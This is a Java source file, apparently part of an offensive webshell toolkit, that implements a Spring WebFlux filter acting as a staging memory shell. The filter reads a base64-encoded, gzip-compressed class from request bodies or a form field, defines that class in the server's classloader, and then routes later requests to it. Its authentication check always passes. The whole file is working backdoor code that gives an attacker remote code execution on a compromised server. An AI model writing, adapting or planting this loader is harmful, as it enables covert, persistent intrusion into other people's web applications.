package com.reajason.noone.core.shelltool;

import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;
import reactor.core.scheduler.Schedulers;

import java.io.*;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class NoOneStagingWebFilter extends ClassLoader implements WebFilter {

    private static volatile Class<?> adaptorClass = null;
    private static volatile Method adaptorMethod = null;
    private static String paramName;
    private static int prefix;
    private static int suffix;

    public NoOneStagingWebFilter() {
    }

    public NoOneStagingWebFilter(ClassLoader parent) {
        super(parent);
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        try {
            if (adaptorClass != null) {
                if (adaptorMethod == null) {
                    adaptorMethod = adaptorClass.getDeclaredMethod("handle", ServerWebExchange.class);
                }
                Mono<Void> result = (Mono<Void>) adaptorMethod.invoke(adaptorClass.newInstance(), exchange);
                if (result != null) {
                    return result;
                }
            }
            ServerHttpRequest request = exchange.getRequest();
            if (isAuthed(request)) {
                ServerHttpResponse response = exchange.getResponse();
                return getArgFromRequest(exchange)
                        .switchIfEmpty(Mono.just(new byte[0]))
                        .map(this::transformReqPayload)
                        .flatMap(payload -> Mono.fromCallable(() -> loadAdaptor(payload, response))
                                .subscribeOn(Schedulers.boundedElastic()))
                        .flatMap(buffer -> response.writeWith(Mono.just(buffer)))
                        .onErrorResume(e -> {
                            try {
                                byte[] errorData = getStackTraceAsString(e).getBytes("UTF-8");
                                wrapResponse(response);
                                DataBuffer errorBuffer = response.bufferFactory().wrap(errorData);
                                return response.writeWith(Mono.just(errorBuffer));
                            } catch (Throwable ex) {
                                return Mono.empty();
                            }
                        });
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return chain.filter(exchange);
    }

    private DataBuffer loadAdaptor(byte[] payload, ServerHttpResponse response) throws Exception {
        if (adaptorClass == null) {
            synchronized (NoOneStagingWebFilter.class) {
                if (adaptorClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(new String(payload, "UTF-8")));
                    adaptorClass = new NoOneStagingWebFilter(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        byte[] data = wrapResData(transformResData("ok".getBytes("UTF-8")));
        wrapResponse(response);
        return response.bufferFactory().wrap(data);
    }

    private boolean isAuthed(ServerHttpRequest request) {
        return true;
    }

    private Mono<byte[]> getArgFromRequest(ServerWebExchange exchange) {
        if (paramName != null) {
            return exchange.getFormData()
                    .flatMap(formData -> Mono.fromCallable(() -> {
                        String payload = formData.getFirst(paramName);
                        return payload.substring(prefix, payload.length() - suffix).getBytes(StandardCharsets.UTF_8);
                    }))
                    .switchIfEmpty(Mono.just(new byte[0]))
                    .onErrorReturn(new byte[0]);
        }
        return DataBufferUtils.join(exchange.getRequest().getBody())
                .map(joined -> {
                    try {
                        byte[] body = new byte[joined.readableByteCount()];
                        joined.read(body);
                        int len = body.length - prefix - suffix;
                        byte[] result = new byte[len];
                        System.arraycopy(body, prefix, result, 0, len);
                        return result;
                    } finally {
                        DataBufferUtils.release(joined);
                    }
                })
                .switchIfEmpty(Mono.just(new byte[0]))
                .onErrorReturn(new byte[0]);
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(ServerHttpResponse response) {
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }
}
